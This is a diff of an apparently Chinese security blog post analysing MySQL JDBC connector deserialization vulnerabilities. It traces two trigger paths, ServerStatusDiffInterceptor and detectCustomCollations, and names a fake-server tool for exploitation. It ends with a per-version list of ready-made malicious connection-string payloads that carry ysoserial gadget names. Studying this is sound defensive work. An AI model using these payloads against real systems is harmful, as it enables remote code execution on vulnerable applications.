+<p>通过上面的了解，我们知道只要调用到<code>ResultSetImpl.getObject()</code>方法，就有机会造成反序列化。我们来看看这个类触发方式的payload(8.x，不同jdbc版本的payload不一样):<br />
+<div class="highlight"><pre><span></span><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
 </code></pre></div></p>
-<h2 id="代理模式和装饰器模式的区别">代理模式和装饰器模式的区别<a class="headerlink" href="#代理模式和装饰器模式的区别" title="Permanent link">#</a></h2>
-<p>装饰器模式关注于在一个对象上动态的添加方法，然而代理模式关注于控制对对象的访问。换句话 说，用代理模式，代理类可以对它的客户隐藏一个对象的具体信息。因此，当使用代理模式的时候，我们常常在一个代理类中创建一个对象的实例。并且，当我们使用装饰器模 式的时候，我们通常的做法是将原始对象作为一个参数传给装饰者的构造器。<br />
-使用代理模式，代理和真实对象之间的的关系通常在编译时就已经确定了，而装饰者能够在运行时递归地被构造。</p>
-<h2 id="总结">总结<a class="headerlink" href="#总结" title="Permanent link">#</a></h2>
-<p>代理模式是SpringAOP的底层，分为静态代理和动态代理，同时了解了JDK自带的动态代理的编写。</p>
+<p>这里传入了2个参数，一个是我们上文提到的<code>autoDeserialize</code>，将其设置为<code>true</code>才有机会进入反序列化，第二个参数则是<code>queryInterceptors</code>，这是一个新的参数，通过查询jdbc的文档知道它一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的类），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）；</p>
+<p>我们这里用到的<code>ServerStatusDiffInterceptor</code>就是一个实现了<code>com.mysql.cj.interceptors.QueryInterceptor</code>的类，其具体触发方式如下，先触发了<code>ServerStatusDiffInterceptor.preProcess()</code>方法:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303113816.png" /></p>
+<p>继续跟进，会调用<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()</code>方法，其会执行<code>SHOW SESSION STATUS</code>，然后将结果传入<code>ResultSetUtil.resultSetToMap()</code>方法:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303113939.png" /></p>
+<p>这里最终调用到了<code>ResultSetImpl.getObject()</code>方法:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303115853.png" /></p>
+<h3 id="detectcustomcollations触发方式">detectCustomCollations触发方式<a class="headerlink" href="#detectcustomcollations触发方式" title="Permanent link">#</a></h3>
+<p>这里的<code>detectCustomCollations</code>是jdbc链接时的一个选项，这个选项是从5.1.29开始的，经过代码比对，可以认为<code>detectCustomCollations</code>这个选项在5.1.29之前一直为true。我们来看看这个类触发方式的payload:<br />
+<div class="highlight"><pre><span></span><code>jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true
+</code></pre></div></p>
+<p>触发点在<code>com.mysql.jdbc.ConnectionImpl</code>的<code>buildCollationMapping</code>方法中，这里可以看到需要满足2个条件：<br />
+1. 服务器版本大于等于4.1.0<br />
+2. <code>detectCustomCollations</code>选项为<code>true</code><br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303120652.png" /></p>
+<p>后续的分析和上面是一样的，其会执行<code>SHOW COLLATION</code>语句并将将结果传入<code>ResultSetUtil.resultSetToMap()</code>方法，最后调用到<code>ResultSetImpl.getObject()</code>方法。</p>
+<h2 id="利用方式">利用方式<a class="headerlink" href="#利用方式" title="Permanent link">#</a></h2>
+<p>实际上利用方式就是构造一个Mysql的虚假服务器，在执行对应语句时返回BLOB类型的数据(恶意的java序列化对象)，一般我们会使用现有的项目: <a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL<em>Fake</em>Server</a></p>
+<h2 id="各个版本payload总结">各个版本payload总结<a class="headerlink" href="#各个版本payload总结" title="Permanent link">#</a></h2>
+<p>这里参考<a href="https://blog.csdn.net/fnmsd/article/details/106232092">这篇文章</a>:</p>
+<p><strong>ServerStatusDiffInterceptor触发：</strong><br />
+<strong>8.x:</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code><br />
+<strong>6.x(属性名不同):</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code><br />
+<strong>5.1.11及以上的5.x版本（包名没有了cj）:</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code><br />
+<strong>5.1.10及以下的5.1.X版本：</strong> 同上，但是需要连接后执行查询。<br />
+<strong>5.0.x:</strong> 还没有<code>ServerStatusDiffInterceptor</code>这个东西┓( ´∀` )┏</p>
+<p><strong>detectCustomCollations触发：</strong><br />
+<strong>6.0.7及以上:</strong> 不可用<br />
+<strong>6.0.2-6.0.6:</strong> <code>jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</code><br />
+<strong>5.1.40-5.1.48:</strong> 需要对<a href="https://github.com/fnmsd/MySQL_Fake_Server">fnmsd/MySQL<em>Fake</em>Server</a>项目稍作调整，将第三个字段也填充为序列化数据即可。<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220304094851.png" /><br />
+<code>jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</code><br />
+<strong>5.1.29-5.1.39:</strong><code>jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</code><br />
+<strong>5.1.19-5.1.28：</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</code><br />
+<strong>5.1.0-5.1.18：</strong> 不可用<br />
+<strong>5.0.x:</strong> 不可用</p>
+<h2 id="参考文章">参考文章<a class="headerlink" href="#参考文章" title="Permanent link">#</a></h2>
+<ol>
+<li><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></li>
+<li><a href="https://blog.csdn.net/fnmsd/article/details/106232092">https://blog.csdn.net/fnmsd/article/details/106232092</a></li>
+<li><a href="https://c014.cn/blog/java/JDBC/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">https://c014.cn/blog/java/JDBC/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li>
+<li><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></li>
+<li><a href="https://xz.aliyun.com/t/10923">https://xz.aliyun.com/t/10923</a></li>
+</ol>
 
               
   
